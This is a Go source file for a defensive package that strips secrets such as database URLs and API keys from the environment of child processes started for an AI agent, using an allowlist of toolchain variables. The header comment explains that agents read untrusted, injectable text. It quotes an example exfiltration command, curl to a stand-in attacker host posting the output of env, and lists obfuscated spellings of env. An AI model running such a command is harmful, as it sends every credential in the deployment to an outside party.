// Package childenv builds the environment for every child process the bridge
// spawns on behalf of an agent or a repository.
//
// The bridge process's own environment holds DATABASE_URL, INTERNAL_AUTH_KEY,
// MCP_SECRETS_KEY and every provider API key it was started with. Three code
// paths used to hand that environment straight to a child process:
//
//   - run_terminal (internal/adapter/tools/shell) — commands an agent writes;
//   - the verify gate (internal/application/board) — commands the repository
//     under test declares for itself, e.g. its own `npm test` script;
//   - stdio MCP servers (internal/adapter/mcp) — programs the user configures.
//
// All three are attacker-influenced. The agent loop consumes untrusted text
// every iteration (repository files, task descriptions, fetched pages), a repo
// can ship any package.json it likes, and an MCP server config is user input.
// Any one of them was enough to run
//
//	curl https://attacker.example -d "$(env)"
//
// and every credential in the pod left it in a single request.
//
// Blocking that by inspecting command text does not work and cannot be made to
// work. `env` is one spelling out of unbounded many — printenv, e”nv,
// $'e\x6ev', a script written to a file and executed, the value base64'd before
// it is sent — and a pattern matcher only ever sees the text it was given. The
// one defense that does not depend on guessing the spelling is that the secrets
// are not in the child's environment for any spelling to read.
//
// This package exists so that defense has exactly one implementation. It lived
// in the shell package first; duplicating a security allowlist into the two
// other call sites is how the three copies drift apart and one of them quietly
// stops being a defense. It deliberately imports nothing but the standard
// library, so any layer — adapter or application — can depend on it without a
// cycle.
package childenv

import (
	"runtime"
	"strings"
)

// forwardedEnvVars is the complete set of environment variables a child
// process inherits from the bridge. Anything not named here (or matched by
// forwardedEnvPrefixes) never reaches it.
//
// This is an allowlist rather than a denylist because a denylist has to
// enumerate secrets that do not exist yet: every credential added to the
// deployment in future would be forwarded by default until somebody remembered
// to deny it. An allowlist fails the other way — a missing build variable is a
// visible, reported build failure, not a silent leak.
//
// The contents are the toolchain surface a developer agent actually needs:
// locating binaries and caches, TLS trust so package installs work, and the
// non-secret git identity that lets `git commit` succeed in an image with no
// global git config. Names are chosen individually rather than by prefix
// wherever a prefix would sweep in credentials — GO* would take
// GOOGLE_APPLICATION_CREDENTIALS, NODE_* would take NODE_AUTH_TOKEN,
// NPM_CONFIG_* would take the registry auth token, GIT_* would take
// GIT_ASKPASS.
//
// One list serves all three call sites on purpose. A run_terminal command, a
// repo-declared verify stage and a stdio MCP server all run the same kind of
// program — a build tool, a test runner, a CLI — with the same toolchain needs,
// and all three are equally attacker-influenced. What legitimately differs per
// call site is the *overlay* (see For), which is passed in explicitly and is
// visible at the call site rather than hidden in this list.
var forwardedEnvVars = map[string]struct{}{
	// Shell and locale.
	"PATH": {}, "HOME": {}, "USER": {}, "LOGNAME": {}, "SHELL": {}, "TERM": {},
	"TMPDIR": {}, "TMP": {}, "TEMP": {}, "LANG": {}, "LANGUAGE": {}, "TZ": {}, "CI": {},

	// Windows system, profile, and session.
	"USERPROFILE": {}, "HOMEDRIVE": {}, "HOMEPATH": {}, "APPDATA": {}, "LOCALAPPDATA": {},
	"ALLUSERSPROFILE": {}, "PROGRAMDATA": {}, "ProgramData": {},
	"SYSTEMROOT": {}, "SystemRoot": {}, "WINDIR": {}, "windir": {},
	"COMSPEC": {}, "ComSpec": {}, "PATHEXT": {}, "SYSTEMDRIVE": {}, "SystemDrive": {},
	"PROGRAMFILES": {}, "ProgramFiles": {}, "PROGRAMFILES(X86)": {}, "ProgramFiles(x86)": {},
	"COMMONPROGRAMFILES": {}, "CommonProgramFiles": {}, "COMMONPROGRAMFILES(X86)": {}, "CommonProgramFiles(x86)": {},
	"NUMBER_OF_PROCESSORS": {}, "PROCESSOR_ARCHITECTURE": {}, "PROCESSOR_IDENTIFIER": {}, "PROCESSOR_LEVEL": {}, "PROCESSOR_REVISION": {},
	"OS": {}, "PUBLIC": {},

	// Proxy and networking.
	"HTTP_PROXY": {}, "HTTPS_PROXY": {}, "NO_PROXY": {},
	"http_proxy": {}, "https_proxy": {}, "no_proxy": {},

	// TLS trust: without these, package installs and `git clone` over HTTPS
	// fail on images that keep their CA bundle outside the default location.
	"SSL_CERT_FILE": {}, "SSL_CERT_DIR": {}, "CURL_CA_BUNDLE": {},
	"REQUESTS_CA_BUNDLE": {}, "NODE_EXTRA_CA_CERTS": {}, "GIT_SSL_CAINFO": {},

	// Go.
	"GOPATH": {}, "GOROOT": {}, "GOBIN": {}, "GOCACHE": {}, "GOMODCACHE": {},
	"GOTOOLCHAIN": {}, "GOFLAGS": {}, "GOPROXY": {}, "GOSUMDB": {}, "GONOSUMDB": {},
	"GOPRIVATE": {}, "GONOSUMCHECK": {}, "GO111MODULE": {}, "GOOS": {}, "GOARCH": {},
	"GOEXPERIMENT": {}, "CGO_ENABLED": {}, "CGO_CFLAGS": {}, "CGO_LDFLAGS": {},

	// Node.
	"NODE_OPTIONS": {}, "NODE_PATH": {}, "NODE_ENV": {}, "NVM_DIR": {}, "NVM_BIN": {},
	"COREPACK_HOME": {}, "PNPM_HOME": {}, "YARN_CACHE_FOLDER": {},
	"NPM_CONFIG_CACHE": {}, "npm_config_cache": {},
	"NPM_CONFIG_PREFIX": {}, "npm_config_prefix": {},
	"NPM_CONFIG_REGISTRY": {}, "npm_config_registry": {},

	// Headless browser. The tools image (deploy/docker/agent-server-tools.Dockerfile)
	// preinstalls system Chromium and sets these so Playwright/Puppeteer use
	// that binary instead of re-downloading their own on every npm ci. All four
	// are a binary path or a skip flag, never a credential.
	"CHROME_BIN": {}, "PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD": {},
	"PUPPETEER_SKIP_CHROMIUM_DOWNLOAD": {}, "PUPPETEER_EXECUTABLE_PATH": {},

	// Python.
	"PYTHONPATH": {}, "PYTHONUNBUFFERED": {}, "PYTHONDONTWRITEBYTECODE": {},
	"VIRTUAL_ENV": {}, "PIP_CACHE_DIR": {}, "PYENV_ROOT": {}, "POETRY_HOME": {},
	"UV_CACHE_DIR": {},

	// JVM / Android / Rust / Ruby.
	"JAVA_HOME": {}, "GRADLE_USER_HOME": {}, "MAVEN_OPTS": {},
	"ANDROID_HOME": {}, "ANDROID_SDK_ROOT": {},
	"CARGO_HOME": {}, "RUSTUP_HOME": {}, "RBENV_ROOT": {},

	// Version-manager and cache locations. These name directories, not
	// credentials; the toolchain resolver looks for mise/asdf installs under
	// them when it picks the Go/Node/Python version a repo declares.
	"MISE_DATA_DIR": {}, "MISE_CONFIG_DIR": {}, "MISE_CACHE_DIR": {},
	"ASDF_DIR": {}, "ASDF_DATA_DIR": {},
	"XDG_CACHE_HOME": {}, "XDG_DATA_HOME": {}, "XDG_CONFIG_HOME": {}, "XDG_STATE_HOME": {},

	// Git commit identity. Not credentials — git authentication in this codebase
	// travels in a per-command http.extraHeader, never in the environment — but
	// without an identity `git commit` aborts with "Author identity unknown" in
	// a container that has no global git config.
	"GIT_AUTHOR_NAME": {}, "GIT_AUTHOR_EMAIL": {},
	"GIT_COMMITTER_NAME": {}, "GIT_COMMITTER_EMAIL": {},

	// Docker daemon endpoint, present only when the operator explicitly enabled
	// the docker sidecar. It is an address, not a secret, and dropping it would
	// break the image builds that sidecar exists to serve.
	"DOCKER_HOST": {},
}

var forwardedEnvVarsUpper = func() map[string]struct{} {
	m := make(map[string]struct{}, len(forwardedEnvVars))
	for k := range forwardedEnvVars {
		m[strings.ToUpper(k)] = struct{}{}
	}
	return m
}()

// forwardedEnvPrefixes covers families where the individual names are not
// enumerable but the whole family is non-secret. LC_* is locale only.
var forwardedEnvPrefixes = []string{"LC_"}

// defaultChildPath is the fallback when the bridge process itself has no PATH
// (a GUI launch context, a scratch container). Without it a scrubbed child gets
// no PATH at all and every command fails with "not found" — a scrub that breaks
// the toolchain gets switched off, so it has to degrade to something workable.
const defaultChildPath = "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/opt/homebrew/bin"
const defaultChildPathWindows = `C:\Windows\System32;C:\Windows;C:\Windows\System32\Wbem`

// IsForwarded reports whether name survives the scrub. Exported for tests that
// need to state which variables are expected to reach a child.
func IsForwarded(name string) bool {
	if _, ok := forwardedEnvVars[name]; ok {
		return true
	}
	if runtime.GOOS == "windows" {
		if _, ok := forwardedEnvVarsUpper[strings.ToUpper(name)]; ok {
			return true
		}
	}
	for _, prefix := range forwardedEnvPrefixes {
		if strings.HasPrefix(name, prefix) {
			return true
		}
		if runtime.GOOS == "windows" && strings.HasPrefix(strings.ToUpper(name), strings.ToUpper(prefix)) {
			return true
		}
	}
	return false
}

// For builds the environment for one child process: the forwarded slice of
// parent, then overlay appended last so its entries win (os/exec keeps the last
// value for a repeated name).
//
// overlay is what the call site legitimately adds on top and is the only thing
// that differs between callers:
//
//   - run_terminal and the verify gate pass the per-task toolchain overlay, so
//     the PATH/GOTOOLCHAIN a repository pins beats the host default;
//   - an MCP server passes the credentials its own config supplies, which are
//     configured for that server rather than inherited from the pod.
//
// It returns a non-empty slice in every case. Handing exec a nil or empty Env
// is not equivalent to handing it a scrubbed one: nil means "inherit
// everything", which is the leak this replaces.
func For(parent, overlay []string) []string {
	env := make([]string, 0, len(parent)+len(overlay)+4)
	hasPath := false
	hasHome := false
	var userProfileVal string

	for _, entry := range parent {
		name, val, ok := strings.Cut(entry, "=")
		if !ok || !IsForwarded(name) {
			continue
		}
		if strings.EqualFold(name, "PATH") {
			hasPath = true
		}
		if strings.EqualFold(name, "HOME") && val != "" {
			hasHome = true
		}
		if strings.EqualFold(name, "USERPROFILE") && val != "" {
			userProfileVal = val
		}
		env = append(env, entry)
	}
	if !hasPath {
		if runtime.GOOS == "windows" {
			env = append(env, "PATH="+defaultChildPathWindows)
		} else {
			env = append(env, "PATH="+defaultChildPath)
		}
	}
	if !hasHome && userProfileVal != "" {
		env = append(env, "HOME="+userProfileVal)
	}
	if runtime.GOOS == "windows" && userProfileVal == "" {
		for _, entry := range env {
			name, val, ok := strings.Cut(entry, "=")
			if ok && strings.EqualFold(name, "HOME") && val != "" {
				env = append(env, "USERPROFILE="+val)
				break
			}
		}
	}
	// Any credential git used to find in the environment is gone now. Without
	// this git falls back to prompting on the terminal and the command hangs
	// until the timeout kills it, which reads to the agent as a flaky failure
	// rather than "this remote needs auth I do not have".
	env = append(env, "GIT_TERMINAL_PROMPT=0")
	return append(env, overlay...)
}
